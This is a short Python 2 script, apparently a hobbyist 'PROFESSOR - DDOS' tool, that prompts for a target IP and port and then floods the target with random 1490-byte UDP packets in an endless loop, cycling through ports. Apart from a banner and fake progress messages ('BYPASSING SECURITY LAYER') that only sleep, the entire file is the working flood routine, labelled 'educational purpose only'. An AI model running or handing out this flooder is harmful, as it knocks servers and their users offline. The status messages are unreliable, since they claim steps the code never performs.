# -*- coding: utf-8 -*-

print ("\033[92m")

import sys
import os
import time
import socket
import random

# Code Time
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

# Colors
green = '\033[92m'
red = '\033[91m'
white = '\033[97m'

os.system("clear")

# Custom Banner
print(green + """
================================================
            PROFESSOR - DDOS
================================================

   CODED BY : SourabhProfessor
   AUTHOR   : SourabhProfessor
   GITHUB   : github.com/SourabhProfessor

================================================
""")

print(red + "Note : Educational Purpose Only")
print(red + "Use It At Your Own Risk\n")

ip = raw_input(green + "IP Target : ")
port = input(green + "Port       : ")

os.system("clear")

print(green + """
================================================
            PROFESSOR - DDOS
================================================
""")

print(green + "________________TRYING TO REACH THE SERVER_____________________")
time.sleep(5)

print(green + "_________________ESTABLISHING CONNECTION_______________________")
time.sleep(5)

print(green + "_________0100100 BYPASSING SECURITY LAYER 001010_______________")
time.sleep(5)

print(green + "_________________CONNECTION ESTABLISHED________________________")
time.sleep(5)

print(red + "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
time.sleep(3)

sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1

     print(green + "Sent %s packet to %s through port:%s"%(sent,ip,port))

     if port == 65534:
       port = 1
